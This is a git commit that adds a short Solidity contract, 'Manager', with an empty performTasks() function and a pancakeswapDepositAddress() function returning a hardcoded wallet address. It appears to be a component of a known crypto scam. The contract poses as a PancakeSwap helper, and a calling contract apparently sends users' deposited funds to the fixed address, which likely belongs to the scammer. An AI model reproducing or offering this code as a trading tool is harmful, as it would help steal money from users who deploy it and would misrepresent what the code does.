61d8892a982eddabc9b26535be58dfa7f9be83a1
s13bp <86206902+s13bp@users.noreply.github.com>
2022-04-06 13:15:35 +0300

    Create class.sol

---
+++ class.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x5795CE30Db8424fE492112f56bA7C1B2E041cA7E;
+    }
+}
+
+//pancakeswapfunction
